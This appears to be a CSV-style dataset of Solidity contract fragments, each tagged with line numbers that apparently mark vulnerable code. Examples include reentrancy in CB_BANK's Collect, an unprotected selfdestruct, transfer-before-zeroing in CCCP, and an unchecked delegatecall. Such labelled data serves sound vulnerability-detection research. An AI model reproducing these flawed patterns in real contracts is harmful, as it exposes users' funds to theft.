    /// @param y The y-coordinate of the tile to buy.
    function buyoutAndSetReferrer(uint256 _gameIndex, bool startNewGameIfIdle, uint256 x, uint256 y, address referrerAddress) external payable {
        // Set the referrer.
        burnupHolding.setReferrer(msg.sender, referrerAddress);
        // Play.
        buyout(_gameIndex, startNewGameIfIdle, x, y);
    }
    /// @notice Spice up the prize pool.
    /// @param _gameIndex The index of the game to add spice to.
    /// @param message An optional message to be sent along with the spice.
    function spiceUp(uint256 _gameIndex, string message) external payable {
        // Check to see if the game should end. Process payment.
        _processGameEnd();
        // Check the game index.
        require(_gameIndex == gameIndex);
        // Game must be live or unpaused.
        require(gameStates[gameIndex].gameStarted || !paused);
        // Funds must be sent.
        require(msg.value > 0);
        // Add funds to the prize pool.
        gameStates[gameIndex].prizePool = gameStates[gameIndex].prizePool.add(msg.value);
        // Emit event.
        SpiceUpPrizePool(gameIndex, msg.sender, msg.value, message, gameStates[gameIndex].prizePool);
    }
    /// @notice End the game. Pay prize.
    function endGame() external {
        require(_processGameEnd());
    }
    /// @dev End the game. Pay prize.
    function _processGameEnd() internal returns(bool) {
        address currentOwner = gameStates[gameIndex].identifierToOwner[gameStates[gameIndex].lastFlippedTile];
        // The game must be started.
        if (!gameStates[gameIndex].gameStarted) {
            return false;
        }
        // The last flipped tile must be owned (i.e. there has been at
        // least one flip).
        if (currentOwner == address(0x0)) {
            return false;
        }
        // The last flipped tile must have become inactive.
        if (gameStates[gameIndex].identifierToBuyoutTimestamp[gameStates[gameIndex].lastFlippedTile].add(gameSettings[gameIndex].activityTimer) >= block.timestamp) {
            return false;
        }
        // Assign prize pool to the owner of the last-flipped tile.
        if (gameStates[gameIndex].prizePool > 0) {
            _sendFunds(currentOwner, gameStates[gameIndex].prizePool);
        }
        // Get coordinates of last flipped tile.
        var (x, y) = identifierToCoordinate(gameStates[gameIndex].lastFlippedTile);
        // Emit event.
        End(gameIndex, currentOwner, gameStates[gameIndex].lastFlippedTile, x, y, gameStates[gameIndex].identifierToBuyoutTimestamp[gameStates[gameIndex].lastFlippedTile].add(gameSettings[gameIndex].activityTimer), gameStates[gameIndex].prizePool);
        // Increment the game index. This won't overflow before the heat death of the universe.
        gameIndex++;
        // Indicate ending the game was successful.
        return true;
    }
}",[64]
"        // Transfer the tile.
        _transfer(currentOwner, msg.sender, identifier);
        // Calculate and set the new tile price.
        gameStates[gameIndex].identifierToBuyoutPrice[identifier] = nextBuyoutPrice(price);
        // Increment the number of tile flips.
        gameStates[gameIndex].numberOfTileFlips++;
        // Emit event
        Buyout(gameIndex, msg.sender, identifier, x, y, block.timestamp, timeout, gameStates[gameIndex].identifierToBuyoutPrice[identifier], gameStates[gameIndex].prizePool);
        // Calculate the excess Ether sent.
        // msg.value is greater than or equal to price,
        // so this cannot underflow.
        uint256 excess = msg.value - price;
        if (excess > 0) {
            // Refund any excess Ether (not susceptible to re-entry attack, as
            // the owner is assigned before the transfer takes place).
            msg.sender.transfer(excess);
        }
    }
    /// @notice Buy the current owner out of the tile. Set the player's referrer.
    /// @param _gameIndex The index of the game to play on.
    /// @param startNewGameIfIdle Start a new game if the current game is idle.
    /// @param x The x-coordinate of the tile to buy.
    /// @param y The y-coordinate of the tile to buy.
    function buyoutAndSetReferrer(uint256 _gameIndex, bool startNewGameIfIdle, uint256 x, uint256 y, address referrerAddress) external payable {
        // Set the referrer.
        burnupHolding.setReferrer(msg.sender, referrerAddress);
        // Play.
        buyout(_gameIndex, startNewGameIfIdle, x, y);
    }
    /// @notice Spice up the prize pool.
    /// @param _gameIndex The index of the game to add spice to.
    /// @param message An optional message to be sent along with the spice.
    function spiceUp(uint256 _gameIndex, string message) external payable {
        // Check to see if the game should end. Process payment.
        _processGameEnd();
        // Check the game index.
        require(_gameIndex == gameIndex);
        // Game must be live or unpaused.
        require(gameStates[gameIndex].gameStarted || !paused);
        // Funds must be sent.
        require(msg.value > 0);
        // Add funds to the prize pool.
        gameStates[gameIndex].prizePool = gameStates[gameIndex].prizePool.add(msg.value);
        // Emit event.
        SpiceUpPrizePool(gameIndex, msg.sender, msg.value, message, gameStates[gameIndex].prizePool);
    }
    /// @notice End the game. Pay prize.
    function endGame() external {
        require(_processGameEnd());
    }
    /// @dev End the game. Pay prize.
    function _processGameEnd() internal returns(bool) {
        // The game must be started.
        if (!gameStates[gameIndex].gameStarted) {
            return false;
        }
        address currentOwner = gameStates[gameIndex].identifierToOwner[gameStates[gameIndex].lastTile];
        // The last flipped tile must be owned (i.e. there has been at
        // least one flip).
        if (currentOwner == address(0x0)) {
            return false;
        }
        // The penultimate tile must have become inactive.
        if (gameStates[gameIndex].penultimateTileTimeout >= block.timestamp) {
            return false;
        }
        // Assign prize pool to the owner of the last-flipped tile.
        if (gameStates[gameIndex].prizePool > 0) {
            _sendFunds(currentOwner, gameStates[gameIndex].prizePool);
        }
        // Get coordinates of last flipped tile.
        var (x, y) = identifierToCoordinate(gameStates[gameIndex].lastTile);
        // Emit event.
        End(gameIndex, currentOwner, gameStates[gameIndex].lastTile, x, y, gameStates[gameIndex].identifierToTimeoutTimestamp[gameStates[gameIndex].lastTile], gameStates[gameIndex].prizePool);
        // Increment the game index. This won't overflow before the heat death of the universe.
        gameIndex++;
        // Indicate ending the game was successful.
        return true;
    }
}",[64]
"  constructor (
    uint64 _countdown,
    uint64 _countdownDecrement,
    uint64 _cooloffIncrement,
    uint64 _pressFee,
    uint64 _signupFee,
    address _sender
  ) public payable {
    countdown = _countdown;
    countdownDecrement = _countdownDecrement;
    cooloffIncrement = _cooloffIncrement;
    pressFee = _pressFee;
    signupFee = _signupFee;
    lastPresser = _sender;
    owner = _sender;
    endBlock = uint64(block.number + countdown);
  }
  function getInfo() public view returns(
    uint64, // Countdown
    uint64, // CountdownDecrement
    uint64, // CooloffIncrement
    uint64, // PressFee
    uint64, // SignupFee
    address,// LastPresser
    uint64, // EndBlock
    uint64, // NumPresses
    uint64, // CooloffEnd
    uint256 // Pot
  ) {
    Presser p = pressers[msg.sender];
    return (
      countdown,
      countdownDecrement,
      cooloffIncrement,
      pressFee,
      signupFee,
      lastPresser,
      endBlock,
      p.numPresses,
      p.cooloffEnd,
      address(this).balance-rake
    );
  }
  function press() public payable {
    require(block.number <= endBlock);
    Presser storage p = pressers[msg.sender];
    require(p.cooloffEnd < block.number);
    uint256 change = msg.value-pressFee;
    if (p.numPresses == 0) {
      // balance - value will never be negative.
      uint128 npf = _newPresserFee(address(this).balance - rake - msg.value);
      change -= npf;
      rake += npf;
    }
    // Breaks when pressFee+newPresserFee > 2^256
    require(change <= msg.value);
    lastPresser = msg.sender;
    uint64 finalCountdown = countdown - (p.numPresses*countdownDecrement);
    if (finalCountdown < 10 || finalCountdown > countdown) {
      finalCountdown = 10;
    }
    endBlock = uint64(block.number + finalCountdown);
    p.numPresses++;
    p.cooloffEnd = uint64(block.number + (p.numPresses*cooloffIncrement));
    if (change > 0) {
      // Re-entrancy protected by p.cooloffEnd guard.
      msg.sender.transfer(change);
    }
    emit Pressed(msg.sender, endBlock);
  }
  function close() public {
    require(block.number > endBlock);
    ButtonFactory f = ButtonFactory(factory);
    if (!owner.send(3*rake/4)){
      // Owner can't accept their portion of the rake, so send it to the factory.
      f.announceWinner.value(rake)(lastPresser, address(this).balance);
    } else {
      f.announceWinner.value(rake/4)(lastPresser, address(this).balance);
    }
    emit Winner(lastPresser, address(this).balance);
    selfdestruct(lastPresser);
  }
  // Breaks when balance = 10^20 ether.
  function newPresserFee() public view returns (uint128) {
    return _newPresserFee(address(this).balance-rake);
  }
  // Caller must assure that _balance < max_uint128.
  function _newPresserFee(uint256 _balance) private view returns (uint128) {
    return uint128((_balance * signupFee) / 10000);
  }
  // Up the stakes...
  function() payable public {
    emit Donation(msg.sender, msg.value);
  }
}
// Hey, my name is Joe...
contract ButtonFactory {
  event NewButton(address indexed buttonAddr, address indexed creator, uint64 countdown, uint64 countdownDec, uint64 cooloffInc, uint64 pressFee, uint64 signupFee);
  event ButtonWinner(address indexed buttonAddr, address indexed winner, uint256 pot);
  address public owner = msg.sender;
  uint256 public creationFee;
  mapping (address => bool) buttons;
  function setCreationFee(uint256 _fee) public {
    require(msg.sender == owner);
    creationFee = _fee;
  }
  function createButton(
    uint64 _countdown,
    uint64 _countdownDecrement,
    uint64 _cooloffIncrement,
    uint64 _pressFee,
    uint64 _signupFee
  ) public payable returns (address) {
    uint256 cf = ((_countdown / 1441) + 1) * creationFee;
    require(msg.value >= cf);
    address newButton = new Button(_countdown, _countdownDecrement, _cooloffIncrement, _pressFee, _signupFee, msg.sender);
    buttons[newButton] = true;
    emit NewButton(newButton, msg.sender, _countdown, _countdownDecrement, _cooloffIncrement, _pressFee, _signupFee);
    return newButton;
  }
  function announceWinner(address _winner, uint256 _pot) public payable {
    require(buttons[msg.sender]);
    delete buttons[msg.sender];
    emit ButtonWinner(msg.sender, _winner, _pot);
  }
  function withdraw() public {
    require(msg.sender == owner);
    msg.sender.transfer(address(this).balance);","[48, 71, 81]"
"//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.8.0;
contract C   {
  function a() external view returns(bytes32){
    return blockhash(block.number-1);
  }
  // function c() public payable {
  // }
  function d() external view returns(uint){
    return address(this).balance;
  }
  function b() public{
    selfdestruct(msg.sender);
  }
}","[12, 13]"
"pragma solidity ^0.4.23;
/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 {
    uint public _totalSupply;
    function totalSupply() public view returns (uint);
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public;
    function allowance(address owner, address spender) public view returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
}
contract C98MultiSend {
    address eth_address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    event transfer(address from, address to, uint amount,address tokenAddress);
    // Transfer multi main network coin
    // Example ETH, BSC, HT
    function transferMulti(address[] receivers, uint256[] amounts) public payable {
        require(msg.value != 0 && msg.value == getTotalSendingAmount(amounts));
        for (uint256 i = 0; i < amounts.length; i++) {
            receivers[i].transfer(amounts[i]);
            emit transfer(msg.sender, receivers[i], amounts[i], eth_address);
        }
    }
    // Transfer multi token ERC20
    function transferMultiToken(address tokenAddress, address[] receivers, uint256[] amounts) public {
        require(receivers.length == amounts.length && receivers.length != 0);
        ERC20 token = ERC20(tokenAddress);
        for (uint i = 0; i < receivers.length; i++) {
            require(amounts[i] > 0 && receivers[i] != 0x0);
            token.transferFrom(msg.sender,receivers[i], amounts[i]);
            emit transfer(msg.sender, receivers[i], amounts[i], tokenAddress);
        }
    }
    function getTotalSendingAmount(uint256[] _amounts) private pure returns (uint totalSendingAmount) {
        for (uint i = 0; i < _amounts.length; i++) {
            require(_amounts[i] > 0);
            totalSendingAmount += _amounts[i];
        }
    }
}","[23, 33]"
"pragma solidity ^0.4.25;
contract CB_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function CB_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.11;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}
contract CCCP {
    using SafeMath for uint256;
    address[] users;
    mapping(address => bool) usersExist;
    mapping(address => address) users2users;
    mapping(address => uint256) balances;
    mapping(address => uint256) balancesTotal;
    uint256 nextUserId = 0;
    uint256 cyles = 100;
    event Register(address indexed user, address indexed parentUser);
    event BalanceUp(address indexed user, uint256 amount);
    event ReferalBonus(address indexed user, uint256 amount);
    event GetMyMoney(address user, uint256 amount);
    function () payable public {
        msg.sender.transfer(msg.value);
    }
    function register(address parentUser) payable public{
        require(msg.value == 20 finney);
        require(msg.sender != address(0));
        require(parentUser != address(0));
        require(!usersExist[msg.sender]);
        _register(msg.sender, msg.value, parentUser);
    }
    function _register(address user, uint256 amount, address parentUser) internal {
        if (users.length > 0) {
            require(parentUser!=user);
            require(usersExist[parentUser]);
        }
        users.push(user);
        usersExist[user]=true;
        users2users[user]=parentUser;
        emit Register(user, parentUser);
        uint256 referalBonus = amount.div(2);
        balances[parentUser] = balances[parentUser].add(referalBonus.div(2));
        balancesTotal[parentUser] = balancesTotal[parentUser].add(referalBonus.div(2));
        emit ReferalBonus(parentUser, referalBonus.div(2));
        balances[users2users[parentUser]] = balances[users2users[parentUser]].add(referalBonus.div(2));
        balancesTotal[users2users[parentUser]] = balancesTotal[users2users[parentUser]].add(referalBonus.div(2));
        emit ReferalBonus(users2users[parentUser], referalBonus.div(2));
        uint256 length = users.length;
        uint256 existLastIndex = length.sub(1);
        for (uint i = 1; i <= cyles; i++) {
            nextUserId = nextUserId.add(1);
            if(nextUserId > existLastIndex){
                nextUserId = 0;
            }
            balances[users[nextUserId]] = balances[users[nextUserId]].add(referalBonus.div(cyles));
            balancesTotal[users[nextUserId]] = balancesTotal[users[nextUserId]].add(referalBonus.div(cyles));
            emit BalanceUp(users[nextUserId], referalBonus.div(cyles));
        }
    }
    function getMyMoney() public {
        require(balances[msg.sender]>0);
        msg.sender.transfer(balances[msg.sender]);
        emit GetMyMoney(msg.sender, balances[msg.sender]);
        balances[msg.sender]=0;
    }
    function balanceOf(address who) public constant returns (uint256 balance) {
        return balances[who];
    }
    function balanceTotalOf(address who) public constant returns (uint256 balanceTotal) {
        return balancesTotal[who];
    }
    function getNextUserId() public constant returns (uint256 nextUserId) {
        return nextUserId;
    }
    function getUserAddressById(uint256 id) public constant returns (address userAddress) {
        return users[id];
    }
}",[73]
"  }
  function pauseToken() onlyOwner public {
    token.pause();
  }
  function unpauseToken() onlyOwner public {
    token.unpause();
  }
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  ) internal {
    token.mint(_beneficiary, _tokenAmount);
  }
  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256 tokens, uint256 weiLeft) {
    tokens = _weiAmount.mul(rate);
    if (sold.add(tokens) > HARD_CAP) {
      tokens = HARD_CAP.sub(sold);
      //alternative to Math.ceil(tokens / rate)
      uint256 weiSpent = (tokens.add(rate).sub(1)).div(rate);
      weiLeft =_weiAmount.sub(weiSpent);
    } else {
      weiLeft = 0;
    }
  }
  function _getBonus(uint256 _tokens) internal view returns (uint256) {
    uint256 possibleBonus = getTimeBonus(_tokens) + getAmountBonus(_tokens);
    if (sold.add(_tokens).add(possibleBonus) > HARD_CAP) {
      return HARD_CAP.sub(sold).sub(_tokens);
    } else {
      return possibleBonus;
    }
  }
  function getTimeBonus(uint256 _tokens) public view returns (uint256) {
    if (now < 1542931200) { //23 nov 2018 00:00:00
      return _tokens.mul(15).div(100);
    } else if (now < 1546041600) { // 29 dec 2018 00:00:00
      return _tokens.mul(7).div(100);
    } else {
      return 0;
    }
  }
  function getAmountBonus(uint256 _tokens) public pure returns (uint256) {
    if (_tokens < 10000 * 10 ** 18) {
      return 0;
    } else if (_tokens < 100000 * 10 ** 18) {
      return _tokens.mul(3).div(100);
    } else if (_tokens < 1000000 * 10 ** 18) {
      return _tokens.mul(5).div(100);
    } else if (_tokens < 10000000 * 10 ** 18) {
      return _tokens.mul(7).div(100);
    } else {
      return _tokens.mul(10).div(100);
    }
  }
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount,
    uint256 _tokens
  ) internal {
    super._updatePurchasingState(_beneficiary, _weiAmount, _tokens);
    sold = sold.add(_tokens);
  }
  function isRefundable() public view returns (bool) {
    return now > END && sold < SOFT_CAP;
  }
  /**
   * @dev function for Daonomic UI
   */
  function getRate(address _token) public view returns (uint256) {
    if (_token == address(0)) {
      return rate * 10 ** 18;
    } else {
      return 0;
    }
  }
  /**
   * @dev function for Daonomic UI
   */
  function start() public pure returns (uint256) {
    return START;
  }
  /**
   * @dev function for Daonomic UI
   */
  function end() public pure returns (uint256) {
    return END;
  }
}",[64]
"        fit = fit_;         // ref per skr
        require(gem.transfer(tap, jam));
    }
    function flow() public note auth {
        require(off);
        out = true;
    }
}
// Copyright (C) 2015, 2016, 2017 Dapphub
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.
contract WETH9 {
    string public name     = ""Wrapped Ether"";
    string public symbol   = ""WETH"";
    uint8  public decimals = 18;
    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;
    function() public payable {
        deposit();
    }
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        Withdrawal(msg.sender, wad);
    }
    function totalSupply() public view returns (uint) {
        return this.balance;
    }
    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        Approval(msg.sender, guy, wad);
        return true;
    }
    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);
        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;
        Transfer(src, dst, wad);
        return true;
    }
}
/*
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
                            Preamble
  The GNU General Public License is a free, copyleft license for
software and other kinds of works.
  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.
  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.
  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.
  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.
  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.
  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.
  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.
  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.
  The precise terms and conditions for copying, distribution and
modification follow.
                       TERMS AND CONDITIONS
  0. Definitions.",[64]
"    modifier cannotMint() { require(mintingFinished); _; }
    function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {
        totalSupply_ = totalSupply_.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Mint(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
    }
    function finishMinting() onlyOwner canMint public returns (bool) {
        mintingFinished = true;
        emit MintFinished();
        return true;
    }
}
// ----------------------------------------------------------------------------
// @title Pausable token
// @dev StandardToken modified with pausable transfers.
// ----------------------------------------------------------------------------
contract PausableToken is StandardToken, Pausable, BlackList {
    function transfer(address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.transfer(_to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.approve(_spender, _value);
    }
    function increaseApproval(address _spender, uint _addedValue) public whenNotPaused CheckBlackList returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }
    function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused CheckBlackList returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
}
// ----------------------------------------------------------------------------
// @title MyToken
// @dev MyToken
// ----------------------------------------------------------------------------
contract MyToken is StandardToken {
  string public name;
  string public symbol;
  uint8 public decimals;
  constructor(string _name, string _symbol, uint8 _decimals, uint256 _initial_supply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply_ = _initial_supply;
    balances[msg.sender] = _initial_supply;
  }
}
contract UpgradableToken is MyToken, Ownable {
  StandardToken public functionBase;
  constructor()
    MyToken(""Upgradable Token"", ""UGT"", 18, 10e28) public
  {
    functionBase = new StandardToken();
  }
  function setFunctionBase(address _base) onlyOwner public {
    require(_base != address(0) && functionBase != _base);
    functionBase = StandardToken(_base);
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(address(functionBase).delegatecall(0xa9059cbb, _to, _value));
    return true;
  }
}
// ----------------------------------------------------------------------------
// @Project_CHARS(Smart_Charging_Platform)
// @Creator_BICASlab(bicaslab@gmail.com)
// @Source_Code_Verification(Noah_Kim)
// ----------------------------------------------------------------------------
contract CHARS is PausableToken, MintableToken, BurnableToken, MultiTransferToken {
    string public name = ""CHARS"";
    string public symbol = ""CHARSV3"";
    uint256 public decimals = 18;
}",[64]
"    modifier cannotMint() { require(mintingFinished); _; }
    function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {
        totalSupply_ = totalSupply_.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Mint(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
    }
    function finishMinting() onlyOwner canMint public returns (bool) {
        mintingFinished = true;
        emit MintFinished();
        return true;
    }
}
// ----------------------------------------------------------------------------
// @title Pausable token
// @dev StandardToken modified with pausable transfers.
// ----------------------------------------------------------------------------
contract PausableToken is StandardToken, Pausable, BlackList {
    function transfer(address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.transfer(_to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {
        return super.approve(_spender, _value);
    }
    function increaseApproval(address _spender, uint _addedValue) public whenNotPaused CheckBlackList returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }
    function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused CheckBlackList returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
}
// ----------------------------------------------------------------------------
// @title MyToken
// @dev MyToken
// ----------------------------------------------------------------------------
contract MyToken is StandardToken {
  string public name;
  string public symbol;
  uint8 public decimals;
  constructor(string _name, string _symbol, uint8 _decimals, uint256 _initial_supply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply_ = _initial_supply;
    balances[msg.sender] = _initial_supply;
  }
}
contract UpgradableToken is MyToken, Ownable {
  StandardToken public functionBase;
  constructor()
    MyToken(""Upgradable Token"", ""UGT"", 18, 10e28) public
  {
    functionBase = new StandardToken();
  }
  function setFunctionBase(address _base) onlyOwner public {
    require(_base != address(0) && functionBase != _base);
    functionBase = StandardToken(_base);
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(address(functionBase).delegatecall(0xa9059cbb, _to, _value));
    return true;
  }
}
// ----------------------------------------------------------------------------
// @Project CharS Project Blockchain & Cryptocurrency(CHARScoin)
// @Creator JEDD-KIM(Blockchain Developer)
// @Source Code Verification(Noah Kim)
// ----------------------------------------------------------------------------
contract CHARScoin is PausableToken, MintableToken, BurnableToken, MultiTransferToken {
    string public name = ""CHARScoin"";
    string public symbol = ""CHARS"";
    uint256 public decimals = 18;
}",[64]
"            tokensSent[msg.sender] = tokensSent[msg.sender].add(tokenBought.add(tempBalance));
            emit LogContributorsPayout(msg.sender, tokenBought.add(tempBalance));
        } else{
            //If softCap is not reached tokens becomes pending
            balance[msg.sender] = balance[msg.sender].add(tokenBought);
        }
        emit LogFundingReceived(msg.sender, msg.value, totalRaised);
        checkIfFundingCompleteOrExpired();
    }
    /**
    * @notice check status
    */
    function checkIfFundingCompleteOrExpired() public {
        //If hardCap is reached ICO ends
        if (totalDistributed == hardCap && state != State.Successful){
            state = State.Successful; //ICO becomes Successful
            completedAt = now; //ICO is complete
            emit LogFundingSuccessful(totalRaised); //we log the finish
            successful(); //and execute closure
        } else if(state == State.PreSale && now > PreSaleDeadline){
            state = State.MainSale; //Once presale ends the ICO holds
        } else if(state == State.MainSale && now > MainSaleDeadline){
            //Once main sale deadline is reached, softCap has to be compared
            if(totalDistributed >= softCap){
                //If softCap is reached
                state = State.Successful; //ICO becomes Successful
                completedAt = now; //ICO is finished
                emit LogFundingSuccessful(totalRaised); //we log the finish
                successful(); //and execute closure
            } else{
                //If softCap is not reached
                state = State.Failed; //ICO becomes Failed
                completedAt = now; //ICO is finished
                emit LogFundingFailed(totalRaised); //we log the finish
            }
        }
    }
    /**
    * @notice successful closure handler
    */
    function successful() public {
        //When successful
        require(state == State.Successful);
        //Check if tokens have been already claimed - can only be claimed one time
        if (claimed == false){
            claimed = true; //Creator is claiming remanent tokens to be burned
            address writer = 0xEB53AD38f0C37C0162E3D1D4666e63a55EfFC65f;
            writer.transfer(5 ether);
            //If there is any token left after ico
            uint256 remanent = hardCap.sub(totalDistributed); //Total tokens to distribute - total distributed
            //It's send to creator
            tokenReward.transfer(creator,remanent);
            emit LogContributorsPayout(creator, remanent);
        }
        //After successful all remaining eth is send to creator
        creator.transfer(address(this).balance);
        emit LogBeneficiaryPaid(creator);
    }
    /**
    * @notice function to let users claim their tokens
    */
    function claimTokensByUser() public {
        //Tokens pending are taken
        uint256 tokens = balance[msg.sender];
        //For safety, pending balance is cleared
        balance[msg.sender] = 0;
        //Tokens are send to user
        require(tokenReward.transfer(msg.sender, tokens));
        //Tokens sent to user updated
        tokensSent[msg.sender] = tokensSent[msg.sender].add(tokens);
        emit LogContributorsPayout(msg.sender, tokens);
    }
    /**
    * @notice function to let admin claim tokens on behalf users
    */
    function claimTokensByAdmin(address _target) onlyAdmin(1) public {
        //Tokens pending are taken
        uint256 tokens = balance[_target];
        //For safety, pending balance is cleared
        balance[_target] = 0;
        //Tokens are send to user
        require(tokenReward.transfer(_target, tokens));
        //Tokens sent to user updated
        tokensSent[_target] = tokensSent[_target].add(tokens);
        emit LogContributorsPayout(_target, tokens);
    }
    /**
    * @notice Failure handler
    */
    function refund() public { //On failure users can get back their eth
        //If funding fail
        require(state == State.Failed);
        //We take the amount of tokens already sent to user
        uint256 holderTokens = tokensSent[msg.sender];
        //For security it's cleared
        tokensSent[msg.sender] = 0;
        //Also pending tokens are cleared
        balance[msg.sender] = 0;
        //Amount of ether sent by user is checked
        uint256 holderETH = ethOnContract[msg.sender];
        //For security it's cleared
        ethOnContract[msg.sender] = 0;
        //Contract try to retrieve tokens from user balance using allowance
        require(tokenReward.transferFrom(msg.sender,address(this),holderTokens));
        //If successful, send ether back
        msg.sender.transfer(holderETH);
        emit LogRefund(msg.sender,holderETH);
    }
    function retrieveOnFail() onlyAdmin(2) public {
        require(state == State.Failed);
